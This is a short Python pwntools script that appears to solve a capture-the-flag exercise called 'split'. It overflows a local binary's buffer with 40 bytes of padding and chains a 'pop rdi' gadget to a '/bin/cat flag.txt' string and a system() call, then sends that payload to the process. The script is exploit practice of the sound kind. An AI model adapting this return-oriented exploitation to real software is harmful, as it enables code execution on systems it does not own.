from pwn import *

context.arch = 'amd64'
prog = process("./split")

payload = b'a' * 40
# pop rdi
payload += p64(0x00000000004007c3)
# /bin/cat flag.txt string
payload += p64(0x0000000000601060)
# system()
payload += p64(0x000000000040074b)
print(payload)

with open("./payload.txt", "wb+") as f:
    f.write(payload)

output = prog.recvuntil(">")
print(output.decode("utf-8"))

prog.clean()

prog.sendline(payload)

output = prog.recvall()
print(output.decode("utf-8"))
